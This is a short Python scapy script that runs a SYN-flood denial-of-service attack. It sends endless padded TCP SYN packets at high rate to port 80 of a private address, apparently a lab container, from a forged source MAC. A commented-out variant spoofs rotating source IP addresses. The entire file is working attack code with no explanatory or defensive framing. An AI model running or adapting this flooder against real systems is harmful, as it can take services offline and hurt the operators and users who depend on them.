from scapy.all import *
from faker import Faker

conf.verb = 0
host_ip = "172.17.0.3"
host_mac = scapy.all.getmacbyip(host_ip)
origen_mac ="00:00:00:00:00:01"

port = 80

origenIP = "192.168.0."
endIP = 10

packet_number = 0

while True:    
    packet_number += 1 
    packet = scapy.all.Ether(src=origen_mac, dst=host_mac) / scapy.all.IP(dst=host_ip) / scapy.all.TCP(sport=RandShort(), dport=port, flags="S") / Raw(b"X"*1024)
    # packet = scapy.all.IP(src= (origenIP+str(endIP)), dst= host) / scapy.all.TCP(sport= RandShort(), dport= port, flags="S")/Raw(b"X"*1024)
    sendp(packet, inter=0.00002, verbose=False) 
    print("Packet %d sent" %packet_number)
    endIP += 1 
    if(endIP == 200):
        endIP = 10
